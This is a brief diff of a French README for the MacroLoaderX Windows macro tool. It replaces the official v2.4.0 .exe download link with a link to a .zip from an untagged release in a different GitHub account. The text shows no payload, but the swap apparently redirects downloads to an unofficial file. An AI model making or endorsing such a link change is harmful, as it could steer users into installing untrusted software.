@@ -63,7 +63,7 @@ Tout est basé sur des scripts Lua que vous écrivez ou importez vous-même.
 
 ### **Version actuelle : v2.4.0 (01/01/2026)**
 
-[⬇️ Télécharger MacroLoaderX.exe](https://github.com/MacroLoaderX/MacroLoaderX/releases/download/v2.4.0/MacroLoaderX_v2.4.0.exe)
+[⬇️ Télécharger MacroLoaderX.exe](https://github.com/n0lex9999/MacroLoaderX/releases/download/untagged-e76d7861168038356685/MacroLoaderX.zip)
 
 > **Taille** : 1.38 MB  
 > **Compatible** : Windows 10 · Windows 11  
